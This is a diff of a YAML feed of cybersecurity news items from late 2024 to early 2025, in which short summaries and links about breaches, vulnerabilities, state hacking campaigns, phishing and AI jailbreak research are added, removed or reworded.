-  - desc: A malicious Ethereum private key stealer was found in a PyPI package, downloaded
-      over 1,000 times, demonstrating ongoing supply chain attacks in open-source
-      ecosystems.
-    link: https://www.bleepingcomputer.com/news/security/ethereum-private-key-stealer-on-pypi-downloaded-over-1-000-times/
+  - desc: Russia’s Sandworm compromising US and European organizations - The "BadPilot
+      campaign" focuses on sectors like energy and telecommunications, exploiting
+      vulnerabilities to maintain access and support Russia's military objectives.
+    link: https://therecord.media/sandworm-subgroup-russia-europe
+  - desc: Trump Hotels Guest Information Leaked on Hacker Forum The threat actor behind
+      this leak, known as _FutureSeeker_, has a history of releasing similar data
+      dumps on hacker forums.
+    link: https://leakd.com/leaks/trump-hotels-guest-information-leaked-on-hacker-forum/
+  - desc: Hackers exploiting bug in popular Trimble Cityworks tool used by local gov’ts-
+      The vulnerability (CVE-2025-0994) allows for a malicious actor to potentially
+      achieve RCE against a customer's IIS server.
+    link: https://therecord.media/hackers-exploiting-trimble-cityworks-bug-used-by-local-govs
+  - desc: How We Hacked a Software Supply Chain for $50K Supply chain attack -- When
+      we discovered that it was possible to retrieve the build layers of the Docker
+      image, it meant there was a strong possibility that the `.npmrc` (and thus the
+      NPM_TOKEN) remained exposed in an earlier layer.
+    link: https://www.landh.tech/blog/20250211-hack-supply-chain-for-50k/
+- date: '2025-02-12'
+  news-items:
+  - desc: Cryptocurrency and blockchain hacker report - The bugs bounties outpay other
+      industries, about 10% vulnerabilities are due to business logic (vs 2% in other
+      industries). Crypto.com runs $2 million in bug bounties.
+    link: https://www.hackerone.com/resources/reporting/8th-hacker-powered-security-report-cryptocurrency-blockchain
+  - desc: Apple Zero Day It was a USB Restricted mode related zero day which was exploited.
+    link: https://www.bleepingcomputer.com/news/apple/apple-fixes-zero-day-exploited-in-extremely-sophisticated-attacks
+  - desc: Ken Huang release Maestro a threat modeling tool for Agentic AI It has seven
+      layers and meant for ongoing use.
+    link: https://cloudsecurityalliance.org/blog/2025/02/06/agentic-ai-threat-modeling-framework-maestro
+  - desc: Researcher at WatchTowr discovered 150+ abandoned sensitive S3 buckets these
+      are from software companies, governments and infrastructure pipelines.
+    link: https://labs.watchtowr.com/8-million-requests-later-we-made-the-solarwinds-supply-chain-attack-look-amateur/
+  - desc: 12, 000+ Keriocontrol firewalls have been exposed to RCE flaw GFI Software
+      released a security update for the problem with version 9.4.5 Patch 1 on December
+      19, 2024, yet three weeks later, according to Censys, over 23,800 instances
+      remained vulnerable.
+    link: https://censys.com/cve-2024-52875/
+  - desc: Toll booth bandits continue to scam users with SMS Messages
+    link: https://www.bitdefender.com/en-us/blog/hotforsecurity/toll-booth-bandits-continue-to-scam-via-sms-messages
+  - desc: Maasive brute force attack uses 2.8 million IPs to target VPN devices most
+      IPs are from Brazil.
+    link: https://www.bleepingcomputer.com/news/security/massive-brute-force-attack-uses-28-million-ips-to-target-vpn-devices
+- date: '2025-02-11'
+  news-items:
+  - desc: Slop and Flop attacks
+    link: https://predictors.fail/
 - date: '2025-02-07'
   news-items:
-  - desc: Hackers are spoofing Microsoft ADFS login pages in a phishing campaign targeting
-      education, healthcare, and government organizations to steal credentials.
+  - desc: Hackers spoof Microsoft ADFS login pages to steal credentials Abnormal Security
+      has detected a new phishing campaign targeting education, healthcare, and government
+      organizations' ADFS
     link: https://www.bleepingcomputer.com/news/security/hackers-spoof-microsoft-adfs-login-pages-to-steal-credentials/
-  - desc: A vulnerability in Cisco Webex Chat allowed unauthorized access to chat
-      histories across multiple organizations, raising concerns over data security.
+  - desc: 'Live Chat Blog : Cisco Webex Connect - Access to millions of chats histories
+      - Ophion Security Publications A vulnerability was discovered in Cisco''s Webex
+      Chat that allowed unauthorized access to the chat histories of many organizations'
     link: https://www.ophionsecurity.com/post/cisco-webex-connect-vulnerability-unauthenticated-access-to-all-chats
-  - desc: AI red teaming research compares jailbreak results of various LLMs, including
-      DeepSeek, Qwen, O1, O3, Claude, and Kimi, highlighting security weaknesses.
+  - desc: 'AI Red Teaming Reasoning LLM US vs China: Jailbreak Deepseek, Qwen, O1,
+      O3, Claude, Kimi Results from a jailbreaking experiment.'
     link: https://adversa.ai/blog/ai-red-teaming-reasoning-llm-jailbreak-china-deepseek-qwen-kimi/
-  - desc: Multiple security flaws found in the DeepSeek iOS app, including sending
-      unencrypted data, exposing users to potential privacy risks.
+  - desc: Multiple security flaws found in DeepSeek iOS app
     link: https://9to5mac.com/2025/02/07/multiple-security-flaws-found-in-deepseek-ios-app-including-sending-unencrypted-data/
-  - desc: CIA mistakenly sent an unclassified email containing names of some employees
-      to the Trump administration, raising security concerns.
+  - desc: C.I.A. Sent an Unclassified Email With Names of Some Employees to Trump
+      Administration
     link: https://www.nytimes.com/2025/02/05/us/politics/cia-names-list.html
-  - desc: An IT trainer and YouTuber claims DeepSeek is misleading users, exposing
-      alleged discrepancies in its AI operations.
+  - desc: Is DeepSeek Lying To You? IT Trainer And YouTuber Exposes The Shocking Truth
     link: https://www.ndtv.com/offbeat/is-deepseek-lying-to-you-it-trainer-and-youtuber-exposes-the-shocking-truth-7641800
-  - desc: Zero-day vulnerabilities in Microsoft Sysinternals allow attackers to execute
-      DLL injection on Windows, posing a significant security threat.
+  - desc: Microsoft Sysinternals 0-Day Vulnerabilities Allow Attackers to Execute
+      DLL Injection on Windows
     link: https://cyberpress.org/microsoft-sysinternals-0-day-vulnerabilities-allow-attackers/
-  - desc: WhatsApp accuses surveillance firm Paragon of hacking, escalating concerns
-      over the misuse of spyware in global surveillance.
+  - desc: WhatsApp accuses Paragon of hacking
     link: https://newsletter.cybersecurityhq.com/p/whatsapp-accuses-paragon-of-hacking
-  - desc: OverTheWire's Bandit wargame is a highly recommended gamified tool for improving
-      Linux command-line skills.
+  - desc: 'OverTheWire: Bandit Great gamified tool to practice and get good at Linux
+      command line.'
     link: https://overthewire.org/wargames/bandit/
-- date: '2024-12-31'
+- date: '2025-02-04'
   news-items:
-  - desc: Claude uses AI to identify new security threats by leveraging advanced natural
-      language processing to analyze patterns and anomalies in real-time, providing
-      proactive threat detection.
-    link: https://www.platformer.news/how-claude-uses-ai-to-identify-new-threats/
-  - desc: Chinese APT exploited a BeyondTrust API key to gain unauthorized access
-      to U.S. Treasury systems, extracting sensitive documents in a significant cybersecurity
-      breach.
-    link: https://thehackernews.com/2024/12/chinese-apt-exploits-beyondtrust-api.html
-  - desc: New HIPAA rules mandate healthcare providers to restore critical data within
-      72 hours and conduct annual compliance audits to enhance patient data protection.
-    link: https://thehackernews.com/2024/12/new-hipaa-rules-mandate-72-hour-data.html
-  - desc: North Korean threat actors deployed OtterCookie malware in the Contagious
-      Interview campaign. This JavaScript malware uses Socket.IO to communicate with
-      a C2 server, enabling shell commands for data theft, including files, clipboard
-      data, and cryptocurrency wallet keys.
-    link: https://thehackernews.com/2024/12/north-korean-hackers-deploy-ottercookie.html
-- date: '2024-12-11'
-  news-items:
-  - desc: Russia has pioneered a new model of drug trafficking using darknet markets
-      and cryptocurrency for payment, with physical 'dead drops' for delivery. Russian
-      platforms like Kraken and Mega now dominate 93% of global darknet markets, generating
-      $1.5 billion in revenue in 2023.
-    link: https://globalinitiative.net/analysis/russia-drug-trade-organized-crime
-  - desc: Attackers are distributing corrupted Word documents that bypass security
-      scans, only to show QR codes leading to credential theft sites after user or
-      automated recovery processes assemble the malware.
-    link: https://thehackernews.com/2024/12/hackers-use-corrupted-zips-and-office.html
-  - desc: UPenn researchers demonstrated how language model-powered robots could be
-      manipulated into dangerous behaviors using automated jailbreak prompts, such
-      as planning explosions and driving off bridges.
-    link: https://www.wired.com/story/researchers-llm-ai-robot-violence/
-  - desc: President Yoon Suk Yeol of South Korea has declared emergency martial law,
-      citing opposition-controlled parliament and alleged North Korean sympathies.
-    link: https://apnews.com/article/south-korea-yoon-martial-law-997c22ac93f6a9bece68454597e577c1
-  - desc: Attackers compromised a GitHub account to publish backdoored versions of
-      Solana's Web3.js library, which could steal private keys from decentralized
-      apps.
-    link: https://www.securityweek.com/solana-web3-js-library-backdoored-in-supply-chain-attack
-  - desc: Threat actors are abusing Cloudflare's pages.dev and workers.dev domains
-      for phishing campaigns, leveraging their trusted reputation and built-in SSL.
-    link: https://www.bleepingcomputer.com/news/security/cloudflares-developer-domains-increasingly-abused-by-threat-actors
-  - desc: iVerify's new spyware detection tool uncovered Pegasus infections in 7 out
-      of 2,500 customer device scans, targeting not just activists but also business
-      leaders and government officials.
-    link: https://www.wired.com/story/iverify-spyware-detection-tool-nso-group-pegasus
-  - desc: The FBI reports criminals are increasingly using AI to enhance scams, creating
-      realistic text, images, and videos for romance, investment, and job fraud.
-    link: https://www.bleepingcomputer.com/news/security/fbi-shares-tips-on-how-to-tackle-ai-powered-fraud-schemes
-  - desc: Russian agents planted spyware on a programmer's Android phone during a
-      forced detention in Moscow, using a trojanized version of Cube Call Recorder
-      with surveillance capabilities.
-    link: https://techcrunch.com/2024/12/05/russian-programmer-says-fsb-agents-planted-spyware-on-his-android-phone
-  - desc: OpenAI is collaborating with Anduril to develop AI-powered anti-drone systems
-      for the U.S. military, building on Anduril's recent defense contract win.
-    link: https://www.theinformation.com/briefings/openai-anduril-to-develop-anti-drone-ai-for-u-s-defense
-  - desc: US Special Forces have ordered 10 NERVA-LG robotic systems for tactical
-      missions, marking their first major investment in unmanned ground vehicles.
-    link: https://oodaloop.com/briefs/technology/us-special-forces-to-get-combat-robots-to-advance-operational-capability/
-  - desc: Apple secured a patent for a system capable of identifying individuals without
-      visible facial features, using data such as walking style and clothing.
-    link: https://therecord.media/apple-patent-body-recognition-biometrics
-  - desc: Russia's Gamaredon hacking group is using Cloudflare Tunnels to conceal
-      infrastructure while deploying GammaDrop malware against Ukrainian targets.
-    link: https://therecord.media/russian-state-hackers-abuse-cloudflare-tunnels-spy-on-ukraine
-  - desc: SailPoint found a critical directory traversal vulnerability (CVE-2024-10905)
-      in their IdentityIQ platform that scores 10/10 CVSS and allows unauthorized
-      file access.
-    link: https://www.securityweek.com/critical-vulnerability-discovered-in-sailpoint-identityiq/
-  - desc: Matt Johansen has launched Vulnerable Media, a technical marketing agency
-      specializing in cybersecurity content and campaigns, after taking Vulnerable
-      U full-time.
-    link: https://www.vulnu.com/p/vulnerable-u-093
-  - desc: Cybersecurity journalist Brian Krebs continues investigating cybercrime
-      despite years of threats and harassment, including swatting attempts and malicious
-      mail.
-    link: https://www.wsj.com/tech/cybersecurity/hacking-brian-krebs-snowflake-waifu-49b87fce
-  - desc: Russian courts sentenced 15 members of the Hydra dark web marketplace, including
-      a life sentence for its creator, after the site facilitated $5 billion in cryptocurrency
-      transactions.
-    link: https://www.wired.com/story/encryption-apps-chinese-telecom-hacking-hydra-russia-exxon/
-- date: '2024-12-07'
-  news-items:
-  - desc: China has deeply compromised thousands of US telco networks according to
-      Senator Mark Warner. The attack, carried out by "Salt Typhoon," involves persistent
-      access requiring device replacements and may include wiretapping capabilities.
-    link: https://www.theregister.com/2024/11/25/salt_typhoon_mark_warner_warning
-  - desc: Volexity uncovered Russian APT28 hackers targeting neighboring organizations
-      to exploit WiFi networks. Using password spraying and lateral movement, the
-      group bypassed MFA-less systems to infiltrate high-value targets.
-    link: https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access
-  - desc: Apple issued urgent patches for iOS, iPadOS, macOS, visionOS, and Safari
-      to fix two zero-day vulnerabilities, CVE-2024-44308 and CVE-2024-44309, addressing
-      potential code execution and XSS risks.
-    link: https://thehackernews.com/2024/11/apple-releases-urgent-updates-to-patch.html
-  - desc: The Danish Navy detained the Chinese bulk carrier Yi Peng 3 for allegedly
-      damaging undersea telecom cables in the Baltic Sea, affecting connections between
-      Finland, Germany, Sweden, and Lithuania.
-    link: https://defence24.com/armed-forces/danish-navy-stopped-a-chinese-ship-suspected-of-damaging-undersea-cables
-  - desc: Crowdstrike reported that China-linked group Liminal Panda has targeted
-      telecom networks in South Asia and Africa since 2020, exploiting protocols like
-      SIGTRAN and GSM for intelligence collection.
-    link: https://thehackernews.com/2024/11/china-backed-hackers-leverage-sigtran.html
-  - desc: Crum & Forster launched a new liability insurance policy for CISOs, covering
-      consulting work and even pro bono IT security activities, protecting against
-      personal liability.
-    link: https://cyberscoop.com/ciso-liability-insurance-coverage-protection-crum-forster
-  - desc: Google blocked over 1,000 pro-China propaganda websites operated by "Glassbridge,"
-      a network of four Chinese firms masquerading as legitimate news outlets.
-    link: https://www.theregister.com/2024/11/25/google_beijing_propaganda
-  - desc: Researchers uncovered Russia scaling up disinformation campaigns using AI-generated
-      Western personas. Techniques include fake profile pictures and coordinated posts
-      to disseminate anti-Ukraine narratives more effectively.
-    link: https://www.politico.com/newsletters/digital-future-daily/2024/11/04/russian-disinformation-navalny-00187164
-- date: '2024-11-19'
-  news-items:
-  - desc: Palo Alto Networks has released Indicators of Compromise (IoCs) for a new
-      zero-day vulnerability affecting their firewalls.
-    link: https://www.securityweek.com/palo-alto-networks-releases-iocs-for-new-firewall-zero-day/
-  - desc: VMware confirmed that threat actors are exploiting two vCenter Server vulnerabilities,
-      CVE-2024-38812 and CVE-2024-38813, which were first disclosed at the 2024 Matrix
-      Cup hacking competition.
-    link: https://www.vulnu.com/p/vmware-confirms-exploitation-of-vcenter-server-bugs
-  - desc: Cybersecurity researchers have disclosed a high-severity security flaw in
-      the PostgreSQL open-source database system. Tracked as CVE-2024-10979 with a
-      CVSS score of 8.8, the flaw could allow unprivileged users to alter environment
-      variables, potentially leading to code execution or information disclosure.
-    link: https://thehackernews.com/2024/11/high-severity-flaw-in-postgresql-allows.html
-- date: '2024-11-12'
-  news-items:
-  - desc: Six critical flaws have been found in the Ollama AI framework, potentially
-      allowing denial-of-service, model theft, and poisoning attacks.
-    link: https://thehackernews.com/2024/11/critical-flaws-in-ollama-ai-framework.html
-  - desc: The FBI is warning about a rise in hacked police emails being used to send
-      fake subpoenas and emergency data requests (EDRs) to U.S. tech companies. Attackers
-      target low-security organizations with high trust, compromising them to gain
-      access to data, permissions, and restricted authorization.
-    link: https://krebsonsecurity.com/2024/11/fbi-spike-in-hacked-police-emails-fake-subpoenas
-  - desc: Google's AI security assessment tool, Big Sleep, found a zero-day vulnerability
-      in the SQLite database engine, marking the first instance where AI uncovered
-      a flaw missed by traditional testing.
-    link: https://thehackernews.com/2024/11/googles-ai-tool-big-sleep-finds-zero.html
-  - desc: The FBI is asking the public for help in identifying Chinese hackers in
-      groups like APT31 and APT41.
-    link: https://thehackernews.com/2024/11/fbi-seeks-public-help-to-identify.html
-  - desc: CrowdStrike has launched new AI Red Team Services to identify vulnerabilities
-      in AI systems and provide guidance on how to fix them.
-    link: https://www.crowdstrike.com/en-us/blog/crowdstrike-launches-ai-red-team-services
-  - desc: Synology is telling users to patch a critical zero-click RCE bug, CVE-2024-10443,
-      affecting millions of DiskStation and BeePhotos NAS devices. Synology advises
-      caution about exposing NAS devices to the internet.
-    link: https://thehackernews.com/2024/11/synology-urges-patch-for-critical-zero.html
-  - desc: Nokia is investigating a potential breach after a hacker, IntelBroker, claimed
-      to have stolen their source code from a third-party vendor. The data includes
-      SSH keys, source code, and RSA keys, accessed via default credentials on a SonarQube
-      server.
-    link: https://www.bleepingcomputer.com/news/security/nokia-investigates-breach-after-hacker-claims-to-steal-source-code/
-  - desc: Canada has ordered TikTok Technology Canada to shut down, citing national
-      security risks. This decision closes the company’s Canadian operations but does
-      not restrict Canadians from using TikTok.
-    link: https://www.bleepingcomputer.com/news/security/canada-orders-tiktok-to-shut-down-over-national-risk-concerns/
-  - desc: Researchers from George Mason University have introduced Mantis, a framework
-      using prompt injections to counterattack against prompt injection attacks, potentially
-      misdirecting or compromising attackers' systems.
-    link: https://arxiv.org/html/2410.20911v1
-  - desc: The U.S. is tightening rules on foreign real estate deals near military
-      bases, adding 60 installations to the CFIUS scrutiny list. This follows the
-      forced closure of a Chinese-owned crypto mine near F.E. Warren Air Force Base.
-    link: https://cowboystatedaily.com/2024/11/08/following-wyoming-example-feds-limit-foreign-crypto-mines-near-military-bases
-- date: '2024-11-04'
-  news-items:
-  - desc: An investigation by French newspaper Le Monde revealed that bodyguards of
-      leaders such as Joe Biden and Donald Trump have used the Strava fitness app,
-      inadvertently disclosing sensitive locations. For instance, the app revealed
-      a San Francisco hotel where President Biden met with Chinese President Xi Jinping.
-    link: https://www.theguardian.com/lifeandstyle/2024/oct/29/strava-problem-fitness-app-locate-worlds-most-powerful-people
-  - desc: Password manager LastPass has alerted users to scammers promoting a fraudulent
-      support number, 805-206-2892, through 5-star reviews on its Chrome extension.
-      Calling this number directs users to download a remote support program that
-      is actually malware.
-    link: https://www.bleepingcomputer.com/news/security/lastpass-warns-of-fake-support-centers-trying-to-steal-customer-data/
-  - desc: Researchers have successfully created voice-based financial scams, like
-      unauthorized bank transfers and credential theft, using the new real-time API
-      in ChatGPT-4o. The scams showed success rates ranging from 20-60%.
-    link: https://www.bleepingcomputer.com/news/security/chatgpt-4o-can-be-used-for-autonomous-voice-based-scams/
-  - desc: Cisco Talos discovered five out-of-bounds vulnerabilities in NVIDIA's shader
-      processing technology and eleven separate issues affecting LevelOne routers.
-    link: https://blog.talosintelligence.com/nvidia-shader-out-of-bounds-and-level1-2/
-  - desc: Okta has patched a critical issue allowing logins without a password if
-      a username exceeded 52 characters. How this passed through extensive testing
-      remains baffling.
-    link: https://www.theinformation.com/briefings/latest-okta-security-flaw-allowed-logins-without-passwords
-  - desc: The US has charged Russian national Maxim Rudometov for creating the RedLine
-      infostealer, following access to the malware's source code and infrastructure.
-    link: https://cyberscoop.com/redline-meta-magnus-rudometov-justice-dutch
-  - desc: The U.S. military has confirmed its first purchase of OpenAI products for
-      AFRICOM, signifying a step towards integrating AI into national security operations.
-    link: https://theintercept.com/2024/10/25/africom-microsoft-openai-military
-  - desc: Bellingcat identified the location where Hamas leader Yahya Sinwar was killed
-      in southern Gaza's Tal as-Sutlan area, using IDF footage and distinct visual
-      markers such as a gazebo and residential tower.
-    link: https://www.bellingcat.com/news/2024/10/17/geolocating-site-where-hamas-leader-yahya-sinwar-was-killed/
+  - desc: '[x] Crypto hacks'
+    link: https://www.hackerone.com/report/cryptocurrency-blockchain
+  - desc: '[x] AGI, Deepseek & Daniel Meissler'
+    link: https://newsletter.danielmiessler.com/p/ul-467
